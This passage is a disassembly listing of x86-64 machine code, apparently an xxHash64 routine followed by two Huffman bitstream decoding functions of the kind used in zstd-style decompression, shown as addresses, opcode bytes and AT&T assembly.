   14000172a:	0f 86 a9 00 00 00    	jbe    0x1400017d9
   140001730:	4d 8b 59 10          	mov    0x10(%r9),%r11
   140001734:	49 8b 41 08          	mov    0x8(%r9),%rax
   140001738:	48 be 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%rsi
   14000173f:	ae b2 c2 
   140001742:	49 8b 59 20          	mov    0x20(%r9),%rbx
   140001746:	4c 89 da             	mov    %r11,%rdx
   140001749:	4c 0f af de          	imul   %rsi,%r11
   14000174d:	48 89 c5             	mov    %rax,%rbp
   140001750:	48 d1 c0             	rol    $1,%rax
   140001753:	48 c1 c2 07          	rol    $0x7,%rdx
   140001757:	48 0f af ee          	imul   %rsi,%rbp
   14000175b:	48 01 c2             	add    %rax,%rdx
   14000175e:	48 89 f8             	mov    %rdi,%rax
   140001761:	48 c1 c0 0c          	rol    $0xc,%rax
   140001765:	48 0f af fe          	imul   %rsi,%rdi
   140001769:	48 01 c2             	add    %rax,%rdx
   14000176c:	48 89 d8             	mov    %rbx,%rax
   14000176f:	48 c1 c5 1f          	rol    $0x1f,%rbp
   140001773:	48 c1 c0 12          	rol    $0x12,%rax
   140001777:	48 0f af de          	imul   %rsi,%rbx
   14000177b:	48 01 c2             	add    %rax,%rdx
   14000177e:	48 c1 c7 1f          	rol    $0x1f,%rdi
   140001782:	48 b8 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%rax
   140001789:	79 37 9e 
   14000178c:	48 0f af e8          	imul   %rax,%rbp
   140001790:	48 0f af f8          	imul   %rax,%rdi
   140001794:	48 c1 c3 1f          	rol    $0x1f,%rbx
   140001798:	48 0f af d8          	imul   %rax,%rbx
   14000179c:	48 31 ea             	xor    %rbp,%rdx
   14000179f:	4c 89 dd             	mov    %r11,%rbp
   1400017a2:	49 bb 63 ae b2 c2 77 	movabs $0x85ebca77c2b2ae63,%r11
   1400017a9:	ca eb 85 
   1400017ac:	48 0f af d0          	imul   %rax,%rdx
   1400017b0:	48 c1 c5 1f          	rol    $0x1f,%rbp
   1400017b4:	48 0f af e8          	imul   %rax,%rbp
   1400017b8:	4c 01 da             	add    %r11,%rdx
   1400017bb:	48 31 ea             	xor    %rbp,%rdx
   1400017be:	48 0f af d0          	imul   %rax,%rdx
   1400017c2:	4c 01 da             	add    %r11,%rdx
   1400017c5:	48 31 fa             	xor    %rdi,%rdx
   1400017c8:	48 0f af d0          	imul   %rax,%rdx
   1400017cc:	4c 01 da             	add    %r11,%rdx
   1400017cf:	48 31 da             	xor    %rbx,%rdx
   1400017d2:	48 0f af d0          	imul   %rax,%rdx
   1400017d6:	4c 01 da             	add    %r11,%rdx
   1400017d9:	49 8d 71 30          	lea    0x30(%r9),%rsi
   1400017dd:	4c 01 d2             	add    %r10,%rdx
   1400017e0:	49 39 f0             	cmp    %rsi,%r8
   1400017e3:	0f 82 90 00 00 00    	jb     0x140001879
   1400017e9:	48 bb 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%rbx
   1400017f0:	ae b2 c2 
   1400017f3:	48 89 f1             	mov    %rsi,%rcx
   1400017f6:	49 ba 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%r10
   1400017fd:	79 37 9e 
   140001800:	49 bb 63 ae b2 c2 77 	movabs $0x85ebca77c2b2ae63,%r11
   140001807:	ca eb 85 
   14000180a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001811:	00 00 00 00 
   140001815:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000181c:	00 00 00 00 
   140001820:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001827:	00 00 00 00 
   14000182b:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001832:	00 00 00 00 
   140001836:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000183d:	00 00 00 
   140001840:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140001844:	48 83 c1 08          	add    $0x8,%rcx
   140001848:	48 0f af c3          	imul   %rbx,%rax
   14000184c:	48 c1 c0 1f          	rol    $0x1f,%rax
   140001850:	49 0f af c2          	imul   %r10,%rax
   140001854:	48 31 d0             	xor    %rdx,%rax
   140001857:	48 c1 c0 1b          	rol    $0x1b,%rax
   14000185b:	49 0f af c2          	imul   %r10,%rax
   14000185f:	4a 8d 14 18          	lea    (%rax,%r11,1),%rdx
   140001863:	49 39 c8             	cmp    %rcx,%r8
   140001866:	73 d8                	jae    0x140001840
   140001868:	4c 89 c0             	mov    %r8,%rax
   14000186b:	4c 29 c8             	sub    %r9,%rax
   14000186e:	48 8d 48 d0          	lea    -0x30(%rax),%rcx
   140001872:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
   140001876:	48 01 f1             	add    %rsi,%rcx
   140001879:	4c 8d 49 04          	lea    0x4(%rcx),%r9
   14000187d:	4d 39 c8             	cmp    %r9,%r8
   140001880:	72 35                	jb     0x1400018b7
   140001882:	8b 01                	mov    (%rcx),%eax
   140001884:	48 b9 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%rcx
   14000188b:	79 37 9e 
   14000188e:	48 0f af c1          	imul   %rcx,%rax
   140001892:	4c 89 c9             	mov    %r9,%rcx
   140001895:	48 31 d0             	xor    %rdx,%rax
   140001898:	48 ba 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%rdx
   14000189f:	ae b2 c2 
   1400018a2:	48 c1 c0 17          	rol    $0x17,%rax
   1400018a6:	48 0f af c2          	imul   %rdx,%rax
   1400018aa:	48 ba f9 79 37 9e b1 	movabs $0x165667b19e3779f9,%rdx
   1400018b1:	67 56 16 
   1400018b4:	48 01 c2             	add    %rax,%rdx
   1400018b7:	4c 39 c1             	cmp    %r8,%rcx
   1400018ba:	73 42                	jae    0x1400018fe
   1400018bc:	49 ba c5 67 56 16 2f 	movabs $0x27d4eb2f165667c5,%r10
   1400018c3:	eb d4 27 
   1400018c6:	49 b9 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%r9
   1400018cd:	79 37 9e 
   1400018d0:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400018d7:	00 00 00 00 
   1400018db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400018e0:	0f b6 01             	movzbl (%rcx),%eax
   1400018e3:	48 83 c1 01          	add    $0x1,%rcx
   1400018e7:	49 0f af c2          	imul   %r10,%rax
   1400018eb:	48 31 d0             	xor    %rdx,%rax
   1400018ee:	48 c1 c0 0b          	rol    $0xb,%rax
   1400018f2:	49 0f af c1          	imul   %r9,%rax
   1400018f6:	48 89 c2             	mov    %rax,%rdx
   1400018f9:	49 39 c8             	cmp    %rcx,%r8
   1400018fc:	75 e2                	jne    0x1400018e0
   1400018fe:	48 89 d0             	mov    %rdx,%rax
   140001901:	48 c1 e8 21          	shr    $0x21,%rax
   140001905:	48 31 d0             	xor    %rdx,%rax
   140001908:	48 ba 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%rdx
   14000190f:	ae b2 c2 
   140001912:	48 0f af c2          	imul   %rdx,%rax
   140001916:	48 89 c2             	mov    %rax,%rdx
   140001919:	48 c1 ea 1d          	shr    $0x1d,%rdx
   14000191d:	48 31 d0             	xor    %rdx,%rax
   140001920:	48 ba f9 79 37 9e b1 	movabs $0x165667b19e3779f9,%rdx
   140001927:	67 56 16 
   14000192a:	48 0f af c2          	imul   %rdx,%rax
   14000192e:	48 89 c2             	mov    %rax,%rdx
   140001931:	48 c1 ea 20          	shr    $0x20,%rdx
   140001935:	48 31 d0             	xor    %rdx,%rax
   140001938:	5b                   	pop    %rbx
   140001939:	5e                   	pop    %rsi
   14000193a:	5f                   	pop    %rdi
   14000193b:	5d                   	pop    %rbp
   14000193c:	c3                   	ret
   14000193d:	0f 1f 00             	nopl   (%rax)
   140001940:	48 83 ec 38          	sub    $0x38,%rsp
   140001944:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001949:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000194e:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001953:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140001958:	e8 53 58 01 00       	call   0x1400171b0
   14000195d:	48 83 c4 38          	add    $0x38,%rsp
   140001961:	c3                   	ret
   140001962:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001969:	00 00 00 00 
   14000196d:	0f 1f 00             	nopl   (%rax)
   140001970:	41 57                	push   %r15
   140001972:	41 56                	push   %r14
   140001974:	41 55                	push   %r13
   140001976:	41 54                	push   %r12
   140001978:	55                   	push   %rbp
   140001979:	57                   	push   %rdi
   14000197a:	56                   	push   %rsi
   14000197b:	53                   	push   %rbx
   14000197c:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   140001981:	49 89 ca             	mov    %rcx,%r10
   140001984:	49 89 d4             	mov    %rdx,%r12
   140001987:	4d 85 c9             	test   %r9,%r9
   14000198a:	0f 84 50 02 00 00    	je     0x140001be0
   140001990:	43 0f b6 44 08 ff    	movzbl -0x1(%r8,%r9,1),%eax
   140001996:	49 83 f9 07          	cmp    $0x7,%r9
   14000199a:	0f 86 88 01 00 00    	jbe    0x140001b28
   1400019a0:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   1400019a7:	84 c0                	test   %al,%al
   1400019a9:	0f 84 65 01 00 00    	je     0x140001b14
   1400019af:	0f bd d0             	bsr    %eax,%edx
   1400019b2:	b8 08 00 00 00       	mov    $0x8,%eax
   1400019b7:	29 d0                	sub    %edx,%eax
   1400019b9:	49 83 f9 88          	cmp    $0xffffffffffffff88,%r9
   1400019bd:	0f 87 34 02 00 00    	ja     0x140001bf7
   1400019c3:	4b 8d 74 08 f8       	lea    -0x8(%r8,%r9,1),%rsi
   1400019c8:	48 8b 16             	mov    (%rsi),%rdx
   1400019cb:	41 0f b6 7b 02       	movzbl 0x2(%r11),%edi
   1400019d0:	4b 8d 2c 22          	lea    (%r10,%r12,1),%rbp
   1400019d4:	4d 8d 4b 04          	lea    0x4(%r11),%r9
   1400019d8:	4d 8d 68 08          	lea    0x8(%r8),%r13
   1400019dc:	4c 8d 75 fd          	lea    -0x3(%rbp),%r14
   1400019e0:	89 fb                	mov    %edi,%ebx
   1400019e2:	f7 db                	neg    %ebx
   1400019e4:	83 e3 3f             	and    $0x3f,%ebx
   1400019e7:	e9 c3 00 00 00       	jmp    0x140001aaf
   1400019ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400019f0:	49 39 f0             	cmp    %rsi,%r8
   1400019f3:	0f 84 c7 01 00 00    	je     0x140001bc0
   1400019f9:	89 c2                	mov    %eax,%edx
   1400019fb:	48 89 f1             	mov    %rsi,%rcx
   1400019fe:	c1 ea 03             	shr    $0x3,%edx
   140001a01:	41 89 d3             	mov    %edx,%r11d
   140001a04:	4c 29 d9             	sub    %r11,%rcx
   140001a07:	4c 39 c1             	cmp    %r8,%rcx
   140001a0a:	0f 82 98 01 00 00    	jb     0x140001ba8
   140001a10:	c1 e2 03             	shl    $0x3,%edx
   140001a13:	48 89 ce             	mov    %rcx,%rsi
   140001a16:	29 d0                	sub    %edx,%eax
   140001a18:	48 8b 11             	mov    (%rcx),%rdx
   140001a1b:	4d 39 f2             	cmp    %r14,%r10
   140001a1e:	0f 83 ac 00 00 00    	jae    0x140001ad0
   140001a24:	89 c1                	mov    %eax,%ecx
   140001a26:	49 89 d3             	mov    %rdx,%r11
   140001a29:	49 83 c2 04          	add    $0x4,%r10
   140001a2d:	49 d3 e3             	shl    %cl,%r11
   140001a30:	89 d9                	mov    %ebx,%ecx
   140001a32:	49 d3 eb             	shr    %cl,%r11
   140001a35:	4b 8d 0c 59          	lea    (%r9,%r11,2),%rcx
   140001a39:	44 0f b6 59 01       	movzbl 0x1(%rcx),%r11d
   140001a3e:	44 0f b6 39          	movzbl (%rcx),%r15d
   140001a42:	41 01 c3             	add    %eax,%r11d
   140001a45:	48 89 d0             	mov    %rdx,%rax
   140001a48:	45 88 7a fc          	mov    %r15b,-0x4(%r10)
   140001a4c:	44 89 d9             	mov    %r11d,%ecx
   140001a4f:	48 d3 e0             	shl    %cl,%rax
   140001a52:	89 d9                	mov    %ebx,%ecx
   140001a54:	48 d3 e8             	shr    %cl,%rax
   140001a57:	49 8d 04 41          	lea    (%r9,%rax,2),%rax
   140001a5b:	0f b6 08             	movzbl (%rax),%ecx
   140001a5e:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001a62:	44 01 d8             	add    %r11d,%eax
   140001a65:	41 88 4a fd          	mov    %cl,-0x3(%r10)
   140001a69:	49 89 d3             	mov    %rdx,%r11
   140001a6c:	89 c1                	mov    %eax,%ecx
   140001a6e:	49 d3 e3             	shl    %cl,%r11
   140001a71:	89 d9                	mov    %ebx,%ecx
   140001a73:	49 d3 eb             	shr    %cl,%r11
   140001a76:	4b 8d 0c 59          	lea    (%r9,%r11,2),%rcx
   140001a7a:	44 0f b6 59 01       	movzbl 0x1(%rcx),%r11d
   140001a7f:	44 0f b6 39          	movzbl (%rcx),%r15d
   140001a83:	41 01 c3             	add    %eax,%r11d
   140001a86:	48 89 d0             	mov    %rdx,%rax
   140001a89:	45 88 7a fe          	mov    %r15b,-0x2(%r10)
   140001a8d:	44 89 d9             	mov    %r11d,%ecx
   140001a90:	48 d3 e0             	shl    %cl,%rax
   140001a93:	89 d9                	mov    %ebx,%ecx
   140001a95:	48 d3 e8             	shr    %cl,%rax
   140001a98:	49 8d 04 41          	lea    (%r9,%rax,2),%rax
   140001a9c:	0f b6 08             	movzbl (%rax),%ecx
   140001a9f:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001aa3:	44 01 d8             	add    %r11d,%eax
   140001aa6:	41 88 4a ff          	mov    %cl,-0x1(%r10)
   140001aaa:	83 f8 40             	cmp    $0x40,%eax
   140001aad:	77 21                	ja     0x140001ad0
   140001aaf:	4c 39 ee             	cmp    %r13,%rsi
   140001ab2:	0f 82 38 ff ff ff    	jb     0x1400019f0
   140001ab8:	89 c2                	mov    %eax,%edx
   140001aba:	83 e0 07             	and    $0x7,%eax
   140001abd:	c1 ea 03             	shr    $0x3,%edx
   140001ac0:	48 29 d6             	sub    %rdx,%rsi
   140001ac3:	48 8b 16             	mov    (%rsi),%rdx
   140001ac6:	4d 39 f2             	cmp    %r14,%r10
   140001ac9:	0f 82 55 ff ff ff    	jb     0x140001a24
   140001acf:	90                   	nop
   140001ad0:	49 39 ea             	cmp    %rbp,%r10
   140001ad3:	73 2f                	jae    0x140001b04
   140001ad5:	f7 df                	neg    %edi
   140001ad7:	83 e7 3f             	and    $0x3f,%edi
   140001ada:	89 c1                	mov    %eax,%ecx
   140001adc:	49 89 d3             	mov    %rdx,%r11
   140001adf:	49 83 c2 01          	add    $0x1,%r10
   140001ae3:	49 d3 e3             	shl    %cl,%r11
   140001ae6:	89 f9                	mov    %edi,%ecx
   140001ae8:	49 d3 eb             	shr    %cl,%r11
   140001aeb:	4f 8d 1c 59          	lea    (%r9,%r11,2),%r11
   140001aef:	41 0f b6 0b          	movzbl (%r11),%ecx
   140001af3:	45 0f b6 5b 01       	movzbl 0x1(%r11),%r11d
   140001af8:	41 88 4a ff          	mov    %cl,-0x1(%r10)
   140001afc:	44 01 d8             	add    %r11d,%eax
   140001aff:	4c 39 d5             	cmp    %r10,%rbp
   140001b02:	75 d6                	jne    0x140001ada
   140001b04:	49 39 f0             	cmp    %rsi,%r8
   140001b07:	0f 84 bc 00 00 00    	je     0x140001bc9
   140001b0d:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   140001b14:	48 89 d0             	mov    %rdx,%rax
   140001b17:	5b                   	pop    %rbx
   140001b18:	5e                   	pop    %rsi
   140001b19:	5f                   	pop    %rdi
   140001b1a:	5d                   	pop    %rbp
   140001b1b:	41 5c                	pop    %r12
   140001b1d:	41 5d                	pop    %r13
   140001b1f:	41 5e                	pop    %r14
   140001b21:	41 5f                	pop    %r15
   140001b23:	c3                   	ret
   140001b24:	0f 1f 40 00          	nopl   0x0(%rax)
   140001b28:	48 8d 1d 31 05 02 00 	lea    0x20531(%rip),%rbx        # 0x140022060
   140001b2f:	41 0f b6 10          	movzbl (%r8),%edx
   140001b33:	4a 63 0c 8b          	movslq (%rbx,%r9,4),%rcx
   140001b37:	48 01 d9             	add    %rbx,%rcx
   140001b3a:	ff e1                	jmp    *%rcx
   140001b3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001b40:	41 0f b6 48 06       	movzbl 0x6(%r8),%ecx
   140001b45:	48 c1 e1 30          	shl    $0x30,%rcx
   140001b49:	48 01 ca             	add    %rcx,%rdx
   140001b4c:	41 0f b6 48 05       	movzbl 0x5(%r8),%ecx
   140001b51:	48 c1 e1 28          	shl    $0x28,%rcx
   140001b55:	48 01 ca             	add    %rcx,%rdx
   140001b58:	41 0f b6 48 04       	movzbl 0x4(%r8),%ecx
   140001b5d:	48 c1 e1 20          	shl    $0x20,%rcx
   140001b61:	48 01 ca             	add    %rcx,%rdx
   140001b64:	41 0f b6 48 03       	movzbl 0x3(%r8),%ecx
   140001b69:	48 c1 e1 18          	shl    $0x18,%rcx
   140001b6d:	48 01 ca             	add    %rcx,%rdx
   140001b70:	41 0f b6 48 02       	movzbl 0x2(%r8),%ecx
   140001b75:	48 c1 e1 10          	shl    $0x10,%rcx
   140001b79:	48 01 ca             	add    %rcx,%rdx
   140001b7c:	41 0f b6 48 01       	movzbl 0x1(%r8),%ecx
   140001b81:	48 c1 e1 08          	shl    $0x8,%rcx
   140001b85:	48 01 ca             	add    %rcx,%rdx
   140001b88:	84 c0                	test   %al,%al
   140001b8a:	74 81                	je     0x140001b0d
   140001b8c:	0f bd c8             	bsr    %eax,%ecx
   140001b8f:	b8 09 00 00 00       	mov    $0x9,%eax
   140001b94:	4c 89 c6             	mov    %r8,%rsi
   140001b97:	44 29 c8             	sub    %r9d,%eax
   140001b9a:	c1 e0 03             	shl    $0x3,%eax
   140001b9d:	29 c8                	sub    %ecx,%eax
   140001b9f:	e9 27 fe ff ff       	jmp    0x1400019cb
   140001ba4:	0f 1f 40 00          	nopl   0x0(%rax)
   140001ba8:	48 89 f2             	mov    %rsi,%rdx
   140001bab:	4c 29 c2             	sub    %r8,%rdx
   140001bae:	89 d1                	mov    %edx,%ecx
   140001bb0:	c1 e2 03             	shl    $0x3,%edx
   140001bb3:	48 29 ce             	sub    %rcx,%rsi
   140001bb6:	29 d0                	sub    %edx,%eax
   140001bb8:	48 8b 16             	mov    (%rsi),%rdx
   140001bbb:	e9 10 ff ff ff       	jmp    0x140001ad0
   140001bc0:	49 39 ea             	cmp    %rbp,%r10
   140001bc3:	0f 82 0c ff ff ff    	jb     0x140001ad5
   140001bc9:	4c 89 e2             	mov    %r12,%rdx
   140001bcc:	83 f8 40             	cmp    $0x40,%eax
   140001bcf:	0f 85 38 ff ff ff    	jne    0x140001b0d
   140001bd5:	e9 3a ff ff ff       	jmp    0x140001b14
   140001bda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001be0:	48 c7 c2 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rdx
   140001be7:	48 89 d0             	mov    %rdx,%rax
   140001bea:	5b                   	pop    %rbx
   140001beb:	5e                   	pop    %rsi
   140001bec:	5f                   	pop    %rdi
   140001bed:	5d                   	pop    %rbp
   140001bee:	41 5c                	pop    %r12
   140001bf0:	41 5d                	pop    %r13
   140001bf2:	41 5e                	pop    %r14
   140001bf4:	41 5f                	pop    %r15
   140001bf6:	c3                   	ret
   140001bf7:	4c 89 ca             	mov    %r9,%rdx
   140001bfa:	e9 15 ff ff ff       	jmp    0x140001b14
   140001bff:	90                   	nop
   140001c00:	41 56                	push   %r14
   140001c02:	41 55                	push   %r13
   140001c04:	41 54                	push   %r12
   140001c06:	55                   	push   %rbp
   140001c07:	57                   	push   %rdi
   140001c08:	56                   	push   %rsi
   140001c09:	53                   	push   %rbx
   140001c0a:	4c 8b 5c 24 60       	mov    0x60(%rsp),%r11
   140001c0f:	48 89 d7             	mov    %rdx,%rdi
   140001c12:	4d 85 c9             	test   %r9,%r9
   140001c15:	0f 84 55 02 00 00    	je     0x140001e70
   140001c1b:	43 0f b6 44 08 ff    	movzbl -0x1(%r8,%r9,1),%eax
   140001c21:	49 83 f9 07          	cmp    $0x7,%r9
   140001c25:	0f 86 85 01 00 00    	jbe    0x140001db0
   140001c2b:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140001c32:	84 c0                	test   %al,%al
   140001c34:	0f 84 67 01 00 00    	je     0x140001da1
   140001c3a:	0f bd d0             	bsr    %eax,%edx
   140001c3d:	b8 08 00 00 00       	mov    $0x8,%eax
   140001c42:	29 d0                	sub    %edx,%eax
   140001c44:	49 83 f9 88          	cmp    $0xffffffffffffff88,%r9
   140001c48:	0f 87 37 02 00 00    	ja     0x140001e85
   140001c4e:	4b 8d 5c 08 f8       	lea    -0x8(%r8,%r9,1),%rbx
   140001c53:	48 8b 13             	mov    (%rbx),%rdx
   140001c56:	41 0f b6 73 02       	movzbl 0x2(%r11),%esi
   140001c5b:	4d 8d 4b 04          	lea    0x4(%r11),%r9
   140001c5f:	48 8d 2c 39          	lea    (%rcx,%rdi,1),%rbp
   140001c63:	4d 8d 60 08          	lea    0x8(%r8),%r12
   140001c67:	4c 8d 6d fd          	lea    -0x3(%rbp),%r13
   140001c6b:	41 89 f3             	mov    %esi,%r11d
   140001c6e:	41 f7 db             	neg    %r11d
   140001c71:	41 83 e3 3f          	and    $0x3f,%r11d
   140001c75:	e9 b9 00 00 00       	jmp    0x140001d33
   140001c7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001c80:	49 39 d8             	cmp    %rbx,%r8
   140001c83:	0f 84 c7 01 00 00    	je     0x140001e50
   140001c89:	89 c2                	mov    %eax,%edx
   140001c8b:	49 89 da             	mov    %rbx,%r10
   140001c8e:	c1 ea 03             	shr    $0x3,%edx
   140001c91:	41 89 d6             	mov    %edx,%r14d
   140001c94:	4d 29 f2             	sub    %r14,%r10
   140001c97:	4d 39 c2             	cmp    %r8,%r10
   140001c9a:	0f 82 90 01 00 00    	jb     0x140001e30
   140001ca0:	c1 e2 03             	shl    $0x3,%edx
   140001ca3:	4c 89 d3             	mov    %r10,%rbx
   140001ca6:	29 d0                	sub    %edx,%eax
   140001ca8:	49 8b 12             	mov    (%r10),%rdx
   140001cab:	4c 39 e9             	cmp    %r13,%rcx
   140001cae:	0f 83 ac 00 00 00    	jae    0x140001d60
   140001cb4:	c4 62 f9 f7 d2       	shlx   %rax,%rdx,%r10
   140001cb9:	c4 42 a3 f7 d2       	shrx   %r11,%r10,%r10
   140001cbe:	4f 8d 14 51          	lea    (%r9,%r10,2),%r10
   140001cc2:	48 83 c1 04          	add    $0x4,%rcx
   140001cc6:	45 0f b6 32          	movzbl (%r10),%r14d
   140001cca:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   140001ccf:	41 01 c2             	add    %eax,%r10d
   140001cd2:	44 88 71 fc          	mov    %r14b,-0x4(%rcx)
   140001cd6:	c4 e2 a9 f7 c2       	shlx   %r10,%rdx,%rax
   140001cdb:	c4 e2 a3 f7 c0       	shrx   %r11,%rax,%rax
   140001ce0:	49 8d 04 41          	lea    (%r9,%rax,2),%rax
   140001ce4:	44 0f b6 30          	movzbl (%rax),%r14d
   140001ce8:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001cec:	44 01 d0             	add    %r10d,%eax
   140001cef:	44 88 71 fd          	mov    %r14b,-0x3(%rcx)
   140001cf3:	c4 62 f9 f7 d2       	shlx   %rax,%rdx,%r10
   140001cf8:	c4 42 a3 f7 d2       	shrx   %r11,%r10,%r10
   140001cfd:	4f 8d 14 51          	lea    (%r9,%r10,2),%r10
   140001d01:	45 0f b6 32          	movzbl (%r10),%r14d
   140001d05:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   140001d0a:	41 01 c2             	add    %eax,%r10d
   140001d0d:	44 88 71 fe          	mov    %r14b,-0x2(%rcx)
   140001d11:	c4 e2 a9 f7 c2       	shlx   %r10,%rdx,%rax
   140001d16:	c4 e2 a3 f7 c0       	shrx   %r11,%rax,%rax
   140001d1b:	49 8d 04 41          	lea    (%r9,%rax,2),%rax
   140001d1f:	44 0f b6 30          	movzbl (%rax),%r14d
   140001d23:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001d27:	44 01 d0             	add    %r10d,%eax
   140001d2a:	44 88 71 ff          	mov    %r14b,-0x1(%rcx)
   140001d2e:	83 f8 40             	cmp    $0x40,%eax
   140001d31:	77 2d                	ja     0x140001d60
   140001d33:	4c 39 e3             	cmp    %r12,%rbx
   140001d36:	0f 82 44 ff ff ff    	jb     0x140001c80
   140001d3c:	89 c2                	mov    %eax,%edx
   140001d3e:	83 e0 07             	and    $0x7,%eax
   140001d41:	c1 ea 03             	shr    $0x3,%edx
   140001d44:	48 29 d3             	sub    %rdx,%rbx
   140001d47:	48 8b 13             	mov    (%rbx),%rdx
   140001d4a:	4c 39 e9             	cmp    %r13,%rcx
   140001d4d:	0f 82 61 ff ff ff    	jb     0x140001cb4
   140001d53:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001d5a:	00 00 00 00 
   140001d5e:	66 90                	xchg   %ax,%ax
   140001d60:	48 39 e9             	cmp    %rbp,%rcx
   140001d63:	73 2c                	jae    0x140001d91
   140001d65:	f7 de                	neg    %esi
   140001d67:	83 e6 3f             	and    $0x3f,%esi
   140001d6a:	c4 62 f9 f7 d2       	shlx   %rax,%rdx,%r10
   140001d6f:	c4 42 cb f7 d2       	shrx   %rsi,%r10,%r10
   140001d74:	4f 8d 14 51          	lea    (%r9,%r10,2),%r10
   140001d78:	48 83 c1 01          	add    $0x1,%rcx
   140001d7c:	45 0f b6 1a          	movzbl (%r10),%r11d
   140001d80:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   140001d85:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140001d89:	44 01 d0             	add    %r10d,%eax
   140001d8c:	48 39 cd             	cmp    %rcx,%rbp
   140001d8f:	75 d9                	jne    0x140001d6a
   140001d91:	49 39 d8             	cmp    %rbx,%r8
   140001d94:	0f 84 bf 00 00 00    	je     0x140001e59
   140001d9a:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   140001da1:	48 89 d0             	mov    %rdx,%rax
   140001da4:	5b                   	pop    %rbx
   140001da5:	5e                   	pop    %rsi
   140001da6:	5f                   	pop    %rdi
   140001da7:	5d                   	pop    %rbp
   140001da8:	41 5c                	pop    %r12
   140001daa:	41 5d                	pop    %r13
   140001dac:	41 5e                	pop    %r14
   140001dae:	c3                   	ret
   140001daf:	90                   	nop
   140001db0:	48 8d 1d c9 02 02 00 	lea    0x202c9(%rip),%rbx        # 0x140022080
   140001db7:	41 0f b6 10          	movzbl (%r8),%edx
   140001dbb:	4e 63 14 8b          	movslq (%rbx,%r9,4),%r10
   140001dbf:	49 01 da             	add    %rbx,%r10
   140001dc2:	41 ff e2             	jmp    *%r10
   140001dc5:	0f 1f 00             	nopl   (%rax)
   140001dc8:	45 0f b6 50 06       	movzbl 0x6(%r8),%r10d
   140001dcd:	49 c1 e2 30          	shl    $0x30,%r10
   140001dd1:	4c 01 d2             	add    %r10,%rdx
   140001dd4:	45 0f b6 50 05       	movzbl 0x5(%r8),%r10d
   140001dd9:	49 c1 e2 28          	shl    $0x28,%r10
   140001ddd:	4c 01 d2             	add    %r10,%rdx
   140001de0:	45 0f b6 50 04       	movzbl 0x4(%r8),%r10d
   140001de5:	49 c1 e2 20          	shl    $0x20,%r10
   140001de9:	4c 01 d2             	add    %r10,%rdx
   140001dec:	45 0f b6 50 03       	movzbl 0x3(%r8),%r10d
   140001df1:	49 c1 e2 18          	shl    $0x18,%r10
   140001df5:	4c 01 d2             	add    %r10,%rdx
   140001df8:	45 0f b6 50 02       	movzbl 0x2(%r8),%r10d
   140001dfd:	49 c1 e2 10          	shl    $0x10,%r10
   140001e01:	4c 01 d2             	add    %r10,%rdx
   140001e04:	45 0f b6 50 01       	movzbl 0x1(%r8),%r10d
   140001e09:	49 c1 e2 08          	shl    $0x8,%r10
   140001e0d:	4c 01 d2             	add    %r10,%rdx
   140001e10:	84 c0                	test   %al,%al
   140001e12:	74 86                	je     0x140001d9a
   140001e14:	44 0f bd d0          	bsr    %eax,%r10d
   140001e18:	b8 09 00 00 00       	mov    $0x9,%eax
   140001e1d:	4c 89 c3             	mov    %r8,%rbx
   140001e20:	44 29 c8             	sub    %r9d,%eax
   140001e23:	c1 e0 03             	shl    $0x3,%eax
   140001e26:	44 29 d0             	sub    %r10d,%eax
   140001e29:	e9 28 fe ff ff       	jmp    0x140001c56
   140001e2e:	66 90                	xchg   %ax,%ax
   140001e30:	48 89 da             	mov    %rbx,%rdx
   140001e33:	4c 29 c2             	sub    %r8,%rdx
   140001e36:	41 89 d2             	mov    %edx,%r10d
   140001e39:	c1 e2 03             	shl    $0x3,%edx
   140001e3c:	4c 29 d3             	sub    %r10,%rbx
   140001e3f:	29 d0                	sub    %edx,%eax
   140001e41:	48 8b 13             	mov    (%rbx),%rdx
   140001e44:	e9 17 ff ff ff       	jmp    0x140001d60
   140001e49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001e50:	48 39 e9             	cmp    %rbp,%rcx
